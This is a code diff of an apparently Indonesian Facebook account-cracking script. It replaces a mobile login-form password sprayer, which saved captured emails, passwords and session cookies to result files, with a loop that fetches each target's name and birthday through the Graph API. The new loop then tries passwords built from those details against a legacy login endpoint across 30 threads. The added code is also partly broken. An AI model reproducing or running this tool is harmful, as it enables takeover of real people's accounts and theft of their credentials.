@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+from multiprocessing.pool import ThreadPool
 import requests,json,os,random,datetime,time,re
 from concurrent.futures import ThreadPoolExecutor as Tree
 from concurrent.futures import ThreadPoolExecutor
@@ -9,6 +10,7 @@ from rich.console import Console
 from rich.columns import Columns
 from rich.panel import Panel as panel
 from rich.console import Console as sol
+import urllib3
 try:
     open('ua.txt','r').read()
 except:
@@ -325,104 +327,70 @@ class crack:
         try:
             for pws in password:
                 self.useragent = self.realme_useragent(total = 1)
-                with requests.Session() as r:
-                    r.headers.update({
-                'Host': 'mbasic.facebook.com',
-			    'cache-control': 'max-age=0',
-                'upgrade-insecure-requests': '1',
-                'origin': 'https://mbasic.facebook.com',
-                'content-type': 'application/x-www-form-urlencoded',
-                'user-agent': self.useragent,
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-                'sec-fetch-site': 'same-origin',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-user': 'empty',
-                'sec-fetch-dest': 'document',
-                'referer': 'https://mbasic.facebook.com/login/?email='+email,
-                'accept-encoding':'gzip, deflate br',
-                'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
-                    response = r.get('https://m.alpha.facebook.com/login.php?').text
-                    try:
-                        ua = random.choice(ugen)
-                        ua2 = random.choice(ugen2)
-                        ses = requests.Session()
-                        for pw in pws:
-                            tix = time.time()
-                            ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-                            p = ses.get('https://mbasic.facebook.com/login/?email='+email).text
-                            dataa ={
-                        'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
-                        'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
-                        'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
-                        'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
-                        'email':email,
-                        'pass':pws}
-                    except (AttributeError) as e:
-                        Console().print("[bold hot_pink2]   ╰─>[bold red] Terjadi Kesalahan!                    ", end='\r');time.sleep(2.0);continue
-                    data = {
-                        'm_ts': self.m_ts,
-                        'li': self.li,
-                        'try_number': 0,
-                        'unrecognized_tries': 0,
-                        'email': email,
-                        'prefill_contact_point': email,
-                        'prefill_source': 'browser_dropdown',
-                        'prefill_type': 'password',
-                        'first_prefill_source': 'browser_dropdown',
-                        'first_prefill_type': 'contact_point',
-                        'had_cp_prefilled': True,
-                        'had_password_prefilled': True,
-                        'is_smart_lock': False,
-                        'bi_xrwh': 0,
-                        'encpass': '#PWD_BROWSER:0:{}:{}'.format(self.__spin_t, pws),
-                        'fb_dtsg': self.fb_dtsg,
-                        'jazoest': self.jazoest,
-                        'lsd': self.lsd,
-                        '__dyn': '',
-                        '__csr': '',
-                        '__req': random.choice(['1','2','3','4','5']),
-                        '__a': self.__a,
-                        '__user': 0
-                    }
-                    r.headers.update({
-                        'cookie': ("; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
-                        'sec-fetch-site': 'same-origin',
-                        'origin': 'https://m.alpha.facebook.com',
-                        'accept': '*/*',
-                        'content-type': 'application/x-www-form-urlencoded',
-                        'x-fb-lsd': self.lsd,
-                        'referer': 'https://m.alpha.facebook.com/login.php?',
-                        'content-length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ])))
-                    })
-                    response2 = r.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', data = data, allow_redirects = True)
-                    open('Response.txt', 'a+').write(f'{email}|{pws}|{r.cookies.get_dict()}\n')
-                    if 'c_user' in r.cookies.get_dict().keys():
-                        try:
-                            self.cookie = (";".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
-                        except:pass
-                        tree = Tree("\r[bold white]LOGIN SUCCESS                      ", style = "bold white")
-                        tree.add(f"[bold green]Email : {email}").add(f"[bold green]Password : {pws}", style = "bold white")
-                        tree.add(f"[bold green]Cookie : {self.cookie}", style = "bold white")
-                        print(tree)
-                        self.success.append(f'{email}|{pws}|{self.cookie}')
-                        open('Results/Ok.txt', 'a+').write(f'{email}|{pws}|{self.cookie}\n')
-                        break
-                    elif 'checkpoint' in r.cookies.get_dict().keys():
-                        tree = Tree("\r[bold white]LOGIN CHECKPOINT                      ", style = "bold white")
-                        tree.add(f"[bold red]Email : {email}").add(f"[bold red]Password : {pws}", style = "bold white")
-                        tree.add(f"[bold red]Useragent : {self.useragent}", style = "bold white")
-                        print(tree)
-                        self.checkpoint.append(f'{email}|{pws}|{self.useragent}')
-                        open('Results/Cp.txt', 'a+').write(f'{email}|{pws}|{self.useragent}\n')
-                        break
+            with requests.Session() as r:
+                a = requests.get('https://graph.facebook.com/' + email + '/?access_token=' +tokenku)
+                b = json.loads(a.text)
+                
+                pass1 = b['first_name'] + '123'
+                data = urllib3.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print('Email :' + email + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass1)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print('Email : ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass1)
+                else:
+                    
+                    pass2 = b['first_name'] + '12345'
+                    data = urllib3.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print('\n\x1b[1;95m Email : ' + email + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass2)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass2)
                     else:
-                        continue
-            self.looping += 1
-            Console().print(f"[bold hot_pink2]   ╰─>[bold white] Crack {str(len(Dump))}/{self.looping} Ok:-[bold green]{len(self.success)}[bold white] Cp:-[bold red]{len(self.checkpoint)}[bold white]              ", end='\r')
-        except (requests.exceptions.ConnectionError, requests.exceptions.ChunkedEncodingError):
-            Console().print("[bold hot_pink2]   ╰─>[bold red] Koneksi Error!                    ", end='\r');time.sleep(7.9);self.main(total, email, password)
-        except Exception as e:
-            Console().print(f"[bold hot_pink2]   ╰─>[bold red] {str(e).title()}!                    ")
+                        pass3 = b['last_name'] + '123'
+                        data = urllib3.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print('\n\x1b[1;95m Email :\x1b[1;97m ' + email + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass3)
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass3)
+                        else:
+                            birth = b['birthday']
+                            pass4 = birth.replace('/', '')
+                            data = urllib3.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                                print ('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass4)
+                            elif 'www.facebook.com' in q['error_msg']:
+                                print ('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass4)
+                            else:
+                                pass5 = b['last_name'] + '04'
+                                data = urllib3.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                q = json.load(data)
+                                if 'access_token' in q:
+                                    print ('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5)
+                                elif 'www.facebook.com' in q['error_msg']:
+                                    print ('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5)
+                                else:
+                                    pass6 = b['first_name'] + '04'
+                                    data = urllib3.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                    q = json.load(data)
+                                    if 'access_token' in q:
+                                        print ('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass6)
+                                    elif 'www.facebook.com' in q['error_msg']:
+                                        print ('\n\x1b[1;91m Email :\x1b[1;97m ' + email + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass6)
+                                    else:
+                                        pass
+                            		
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print('\n\x1b[1;91m[+] \x1b[1;97mFinish')
+    daftar_menu();time.sleep(3)
+    
     ### REALME USERAGENT ###
     def realme_useragent(self, total):
         for _ in range(total):
